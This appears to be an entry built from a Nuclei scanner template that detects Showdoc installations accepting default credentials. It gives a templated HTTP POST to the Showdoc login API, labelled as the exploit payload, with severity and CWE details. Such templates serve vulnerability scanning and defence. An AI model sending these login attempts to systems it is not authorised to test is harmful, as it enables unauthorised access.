# Nuclei Template: Showdoc Default Login
**Template ID:** showdoc-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** Medium
**CWE:** CWE-522
**Source:** Nuclei Template (`showdoc-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Showdoc default credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /server/index.php?s=/api/user/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

username={{username}}&password={{password}}&v_code=
```

## References
- https://blog.star7th.com/2016/05/2007.html
